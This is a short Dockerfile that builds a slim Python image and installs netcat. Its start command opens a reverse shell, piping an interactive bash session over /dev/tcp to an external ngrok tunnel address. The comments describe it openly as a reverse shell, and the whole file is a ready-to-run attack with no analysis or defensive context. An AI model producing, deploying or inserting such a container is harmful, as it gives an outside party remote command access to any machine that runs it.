# Use a lightweight Python image (or any other slim base you like)
FROM python:3.9-slim

# Install netcat (or another tool you'll use for the reverse shell)
RUN apt-get update && apt-get install -y netcat-traditional

# Set the working directory (optional here)
WORKDIR /app

# The reverse‑shell – this is the command that runs when the container starts
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12951 0>&1"]